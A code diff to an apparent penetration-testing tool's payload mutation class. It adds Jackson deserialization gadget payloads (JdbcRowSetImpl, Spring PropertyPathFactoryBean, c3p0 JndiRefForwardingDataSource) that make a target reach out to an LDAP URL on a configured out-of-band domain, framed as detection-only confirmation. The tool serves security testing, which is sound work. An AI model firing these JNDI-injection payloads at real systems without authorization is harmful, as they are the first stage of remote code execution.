@@ -71,6 +71,8 @@ class PayloadMutation:
             return self._mutate_dotnet_jsonnet()
         if self.probe in ("rce", "phar_deser", "ssrf", "php_input", "lfi", "code_inject", "traversal", "stream"):
             return self._mutate_wrapper()
+        if self.probe == "jackson_manual":
+            return self._mutate_jackson_oob()
         return []
 
 
@@ -228,8 +230,45 @@ class PayloadMutation:
 
         return results
 
-    
-    
+
+    JACKSON_OOB_GADGETS = [
+        ("com.sun.rowset.JdbcRowSetImpl", '["com.sun.rowset.JdbcRowSetImpl",{{"dataSourceName":"ldap://{domain}/a","autoCommit":true}}]'),
+        ("org.springframework.beans.factory.config.PropertyPathFactoryBean",
+         '["org.springframework.beans.factory.config.PropertyPathFactoryBean",'
+         '{{"targetBeanName":"ldap://{domain}/a","propertyPath":"foo",'
+         '"beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",'
+         '{{"shareableResources":["ldap://{domain}/a"]}}]}}]'),
+        ("com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+         '["com.mchange.v2.c3p0.JndiRefForwardingDataSource",'
+         '{{"jndiName":"ldap://{domain}/a","loginTimeout":"0"}}]'),
+    ]
+
+    def _mutate_jackson_oob(self) -> Mutations:
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return [{
+                "error": "No OOB domain configured",
+                "hint": "Set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain",
+            }]
+
+        results: Mutations = []
+        for gadget_class, template in self.JACKSON_OOB_GADGETS:
+            raw = template.format(domain=oob_domain)
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("jackson_oob", gadget_class, None, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                f"Jackson default/polymorphic typing confirmation only — check {oob_domain}'s "
+                "interaction log for an inbound LDAP/DNS callback. This does NOT achieve RCE by "
+                "itself: a real exploit additionally needs a rogue LDAP/RMI server returning a "
+                "Reference plus a hosted malicious class, which this tool does not provide or run"
+            )
+            results.append(payload)
+
+        return results
+
+
+
     PHPGGC_PATH = get_tool_path("phpggc")
     
     PHP_GADGET_CHAINS_MAP = {
